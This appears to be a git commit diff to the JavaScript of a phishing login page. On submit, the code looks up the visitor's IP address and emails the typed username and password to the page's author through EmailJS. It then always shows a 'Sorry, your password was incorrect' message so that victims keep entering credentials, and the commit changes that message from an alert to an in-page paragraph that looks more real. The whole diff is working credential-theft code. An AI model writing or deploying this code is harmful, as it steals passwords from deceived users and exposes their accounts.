6c62b7eff7ebb8f9f4b5ef2f3f4bcbfc21668dc9
M-Abdullah-Bhatti <muhammadabdullahimdad@gmail.com>
2023-03-09 19:27:26 +0500

    feature added

--- index.js
+++ index.js
@@ -1,3 +1,41 @@
+// const btn = document.getElementById("button");
+
+// document.getElementById("form").addEventListener("submit", function (event) {
+//   event.preventDefault();
+
+//   // btn.value = "Sending...";
+
+//   const serviceID = "default_service";
+//   const templateID = "template_4l71e0a";
+
+//   fetch("https://api.ipify.org?format=json")
+//     .then((response) => response.json())
+//     .then((data) => {
+//       console.log("data" + data);
+//       // Construct email parameters object
+//       var params = {
+//         from_name: document.getElementById("from_name").value,
+//         password: document.getElementById("password").value,
+//         IP: data.ip,
+//       };
+
+//       emailjs
+//         .send(serviceID, templateID, params)
+//         .then((res) => {
+//           // Clear form fields and show success message
+//           document.getElementById("from_name").value = "";
+//           document.getElementById("password").value = "";
+//           console.log(res);
+//           alert("Incorrect Password");
+//         })
+//         .catch((err) => {
+//           console.log(err);
+//           alert("Incorrect Password");
+//         });
+//     });
+// });
+
+//00000000000000000000000000000000000000000000000000000000000000000
 const btn = document.getElementById("button");
 
 document.getElementById("form").addEventListener("submit", function (event) {
@@ -7,7 +45,6 @@ document.getElementById("form").addEventListener("submit", function (event) {
 
   const serviceID = "default_service";
   const templateID = "template_4l71e0a";
-
   fetch("https://api.ipify.org?format=json")
     .then((response) => response.json())
     .then((data) => {
@@ -26,11 +63,17 @@ document.getElementById("form").addEventListener("submit", function (event) {
           document.getElementById("from_name").value = "";
           document.getElementById("password").value = "";
           console.log(res);
-          alert("Incorrect Password");
+          let errorMsg = document.createElement("p");
+          errorMsg.innerText = "Sorry, your password was incorrect";
+          errorMsg.classList.add("incorrect__password");
+          document.getElementById("form").appendChild(errorMsg);
         })
         .catch((err) => {
           console.log(err);
-          alert("Incorrect Password");
+          let errorMsg = document.createElement("p");
+          errorMsg.innerText = "Sorry, your password was incorrect";
+          errorMsg.classList.add("incorrect__password");
+          document.getElementById("form").appendChild(errorMsg);
         });
     });
 });
